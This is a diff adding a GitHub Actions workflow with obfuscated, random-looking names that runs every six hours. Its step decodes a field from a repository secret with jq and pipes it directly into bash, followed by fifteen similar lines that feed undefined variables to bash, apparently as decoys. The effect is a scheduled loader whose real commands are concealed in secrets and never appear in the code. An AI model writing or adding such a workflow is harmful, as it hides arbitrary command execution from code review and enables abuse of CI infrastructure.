@@ -1,0 +1,32 @@
+name: tengneirong6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tengneirong6789
+        env:
+          olzm6996: ${{ secrets.olzm6996 }}
+        run: |
+          echo $olzm6996 | jq -r .qrt1889 | /bin/bash
+          echo $ih28 | jq -r .gm33 | /bin/bash
+          echo $vco53149 | jq -r .x7713 | /bin/bash
+          echo $myoo8 | jq -r .jvdv82 | /bin/bash
+          echo $jkf7834 | jq -r .f88 | /bin/bash
+          echo $ztmc9361 | jq -r .pms03517 | /bin/bash
+          echo $bim0099 | jq -r .w21 | /bin/bash
+          echo $ehn69429 | jq -r .gjdnp0228 | /bin/bash
+          echo $mhtr5194 | jq -r .tfuu474 | /bin/bash
+          echo $m09550 | jq -r .bz59 | /bin/bash
+          echo $trkq33 | jq -r .v6 | /bin/bash
+          echo $l95 | jq -r .j9 | /bin/bash
+          echo $mwpbo14 | jq -r .j39 | /bin/bash
+          echo $ghob2884 | jq -r .p1 | /bin/bash
+          echo $vm77080 | jq -r .ao043 | /bin/bash
+          echo $sv95 | jq -r .lzpc6 | /bin/bash
+
